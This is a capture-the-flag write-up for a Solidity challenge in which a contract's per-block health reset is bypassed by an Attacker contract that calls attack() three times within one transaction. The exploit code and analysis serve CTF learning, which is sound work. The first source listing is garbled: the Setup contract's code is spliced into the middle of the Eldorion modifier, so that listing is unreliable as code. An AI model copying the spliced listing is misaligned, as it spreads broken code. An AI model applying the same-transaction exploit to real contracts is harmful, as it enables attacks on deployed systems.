## Challenge Overview

The Eldorion challenge features a smart contract representing a powerful entity with 300 health points.

To solve the challenge, we must defeat Eldorion by reducing its health to exactly zero.
## Source Code
``Eldorion.sol``
```C#
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Eldorion {
    uint256 public health = 300;
    uint256 public lastAttackTimestamp;
    uint256 private constant MAX_HEALTH = 300;
    
    event EldorionDefeated(address slayer);
    
    modifier eternalResilience() {
        if (block.timestamp > lastAttackTimestamp) {
            health = MAX_HEALTH;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Eldorion } from "./Eldorion.sol";

contract Setup {
    Eldorion public immutable TARGET;
    
    event DeployedTarget(address at);

    constructor() payable {
        TARGET = new Eldorion();
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return TARGET.isDefeated();
    }
}

            lastAttackTimestamp = block.timestamp;
        }
        _;
    }
    
    function attack(uint256 damage) external eternalResilience {
        require(damage <= 100, "Mortals cannot strike harder than 100");
        require(health >= damage, "Overkill is wasteful");
        health -= damage;
        
        if (health == 0) {
            emit EldorionDefeated(msg.sender);
        }
    }

    function isDefeated() external view returns (bool) {
        return health == 0;
    }
}
```
``Setup.sol``
```C#
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Eldorion } from "./Eldorion.sol";

contract Setup {
    Eldorion public immutable TARGET;
    
    event DeployedTarget(address at);

    constructor() payable {
        TARGET = new Eldorion();
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return TARGET.isDefeated();
    }
}

```

## Vulnerability Analysis

The key vulnerability in the `Eldorion.sol`  contract lies in its `eternalResilience` modifier:

```javascript
modifier eternalResilience() {
    if (block.timestamp > lastAttackTimestamp) {
        health = MAX_HEALTH;
        lastAttackTimestamp = block.timestamp;
    }
    _;
}
```

This modifier resets the health to maximum (300) if a new block timestamp is detected. 

However, multiple function calls within a single transaction share the same block timestamp, creating an exploitation opportunity.

The `attack` function allows us to deal damage up to 100 points per call, and we will call 3 times to reduce heath to exact 0 and get flag.

```solidity
function attack(uint256 damage) external eternalResilience {
    require(damage <= 100, "Mortals cannot strike harder than 100");
    require(health >= damage, "Overkill is wasteful");
    health -= damage;
    
    if (health == 0) {
        emit EldorionDefeated(msg.sender);
    }
}
```

## Exploitation Strategy

The exploit relies on executing multiple attacks within a single transaction to bypass the health reset mechanism. 

Since we need to deal exactly 300 damage and each attack is limited to 100 damage, we need to execute 3 attack calls in one transaction.

### Attack Implementation

Our `Attacker.sol`contract:

```solidity
contract Attacker {
    IEldorion public target;
    
    constructor(address _target) {
        target = IEldorion(_target);
    }
    
    function exploit() external {
        target.attack(100);
        target.attack(100);
        target.attack(100);
    }
}
```

This contract makes three consecutive attack calls within a single function execution as a single transaction. This prevents the `eternalResilience` modifier from resetting health between attacks.

## Execution Steps

1. Deploy the Attacker contract with the Eldorion contract address
2. Call the exploit function, which executes three 100-damage attacks in sequence
3. The Eldorion's health is reduced from 300 → 200 → 100 → 0, defeating it

![alt text](image.png)
